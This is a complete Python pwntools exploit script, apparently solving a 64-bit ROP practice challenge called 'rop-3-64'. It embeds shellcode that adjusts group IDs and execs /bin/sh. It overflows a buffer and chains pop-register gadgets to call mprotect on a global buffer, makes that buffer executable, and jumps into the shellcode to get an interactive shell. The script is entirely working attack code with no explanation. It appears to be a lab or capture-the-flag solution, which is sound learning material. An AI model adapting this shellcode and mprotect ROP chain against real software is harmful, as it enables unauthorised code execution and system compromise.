#!/usr/bin/env python
from pwn import *

p = process("./rop-3-64")

SHELLCODE = 'jlX\x0f\x05H\x89\xc6H\x89\xc7jrX\x0f\x05H1\xf6H1\xd2j;XH\xbb//bin/shj\x00SH\x89\xe7\x0f\x05'

'''
0x0000000000400743 : pop rdi ; ret
0x000000000040064a : pop rdx ; nop ; pop rbp ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
'''

#    [SHELLCODE]          [buffer-fill]   [saved_ebp]
buf = SHELLCODE + "A" *(0x80-len(SHELLCODE))+"BBBBBBBB"
#         [pop rdi]  [g_buf-aligned]   [pop rsi]    [0x1000]    [0000]     [pop rdx]    [7]    [0000]    [mprotect]     [g_buf]
buf += p64(0x400743)+p64(0x601000)+p64(0x400741)+p64(0x1000)+p64(0000)+p64(0x40064a)+p64(7)+p64(0000)+p64(0x400520)+p64(0x601080)

with open('test','wb')as f:
      f.write(buf);

p.sendline(buf)
p.interactive()